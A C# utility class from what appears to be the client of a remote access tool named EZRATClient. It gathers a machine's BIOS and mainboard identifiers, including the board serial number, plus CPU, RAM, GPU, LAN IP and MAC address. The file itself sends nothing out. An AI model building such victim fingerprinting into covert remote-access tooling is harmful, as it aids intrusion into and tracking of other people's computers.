using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace EZRATClient.Utils
{
    class SystemInfoDetails
    {

        public static string GetBiosIdentifier()
        {
            try
            {
                string biosIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BIOS";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        biosIdentifier = mObject["Manufacturer"].ToString();
                        break;
                    }
                }

                string tmp = "Bios : ";
                tmp += (!string.IsNullOrEmpty(biosIdentifier)) ? biosIdentifier : "N/A";
                return tmp;
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string GetMainboardIdentifier()
        {
            try
            {
                string mainboardIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BaseBoard";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        mainboardIdentifier = mObject["Manufacturer"].ToString() + mObject["SerialNumber"].ToString();
                        break;
                    }
                }

                string tmp = "Mainboard : ";
                tmp += (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
                return tmp;
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string GetCpuName()
        {
            try
            {
                string cpuName = string.Empty;
                string query = "SELECT * FROM Win32_Processor";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        cpuName += mObject["Name"].ToString() + "; ";
                    }
                }
                cpuName = cpuName.Substring(0, cpuName.Length - 1);
                string tmp = "CPU : ";
                tmp += (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
                return tmp;
            }
            catch
            {

            }

            return "Unknown";
        }

        public static string GetTotalRamAmount()
        {
            try
            {
                double installedRAM = 0;
                string query = "Select * From Win32_ComputerSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
                        installedRAM = bytes;
                        break;
                    }
                }
                string tmp = $"RAM : {ToolBox.ReduceByteSize(installedRAM.ToString())}";
                return tmp;
            }
            catch
            {
                return "RAM : 0";
            }
        }

        public static string GetGpuName()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        gpuName += mObject["Description"].ToString() + "; ";
                    }
                }
                string tmp = "GPU : ";
                gpuName = gpuName.Substring(0, gpuName.Length - 1);

                tmp += (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
                return tmp;
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetLanIp(bool onlyIp = false)
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (gatewayAddress != null) //exclude virtual physical nic with no default gateway
                {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                                ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                                continue;

                            return (onlyIp)? ip.Address.ToString():$"IP : {ip.Address.ToString()}";
                        }
                    }
                }
            }

            return "-";
        }

        public static string GetMacAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    bool foundCorrect = false;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        var tmp = IPAddress.Parse(GetLanIp(true));
                        if (ip.Address.Address == tmp.Address)
                        {
                            foundCorrect = true;
                        }
                    }

                    if (foundCorrect)
                    {
                        string addr = string.Empty;
                        StringBuilder sb = new StringBuilder(ni.GetPhysicalAddress().ToString().ToUpper());
                        for (int i = 0; i < sb.Length; i+=2)
                        {
                                addr += $"{sb[i]}{sb[i + 1]}-";
                        }
                        return $"MAC : {addr.Substring(0,addr.Length - 1)}";
                    }
                }
            }

            return "-";
        }
    }
}
